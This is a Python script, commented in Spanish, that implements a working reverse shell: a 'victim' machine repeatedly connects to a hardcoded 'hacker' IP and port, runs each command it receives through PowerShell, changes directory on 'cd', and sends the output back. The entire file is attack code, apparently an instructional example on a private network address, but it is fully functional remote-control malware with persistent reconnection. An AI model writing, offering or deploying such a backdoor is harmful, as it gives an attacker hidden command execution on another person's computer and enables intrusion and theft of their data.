import socket
import subprocess
import time
import os

# Identificador para marcar el final del resultado del comando
IDENTIFIER = "<FIN_DEL_RESULTADO_DEL_COMANDO>"

if __name__ == "__main__":
    
    # Dirección IP del hacker
    hacker_IP = "192.168.100.62"
    # Puerto utilizado por el hacker
    hacker_port = 8008
    # Dirección completa del hacker
    hacker_address = (hacker_IP, hacker_port)
    
    while True:
        try:
            
            # Crear un socket para la víctima
            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
            # Intentar conectarse al hacker
            print("Intentando conectarse con ", hacker_address)
            victim_socket.connect(hacker_address)
            while True:    
                # Recibir datos del hacker
                data = victim_socket.recv(1024)

                # Decodificar el comando recibido desde el hacker
                hacker_command = data.decode()
                print("Comando del hacker = ", hacker_command)
                if hacker_command == "stop":
                    # Esta parte es para salir del programa de manera segura
                    break
                elif hacker_command == "":
                    # Si el hacker presiona Enter inesperadamente
                    continue
                elif hacker_command.startswith("cd"):
                    # Para cambiar de directorio
                    path2move = hacker_command.strip("cd ")
                    if os.path.exists(path2move):
                        # Comando para moverse al directorio requerido si existe
                        os.chdir(path2move)
                    else:
                        print("No se puede cambiar al directorio ", path2move)
                    continue
                else:
                    # Ejecutar comando de PowerShell desde el hacker
                    output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True)
                    if output.stderr.decode("utf-8") == "":
                        command_result = output.stdout
                        command_result = command_result.decode("utf-8") + IDENTIFIER
                        command_result = command_result.encode("utf-8")
                    else:
                        command_result = output.stderr
                    
                    # Enviar el resultado del comando de vuelta al hacker
                    victim_socket.sendall(command_result)
        except KeyboardInterrupt:
            print("Saliendo")
        except Exception as err:
            print("No se puede conectar: ", err)
            time.sleep(5)
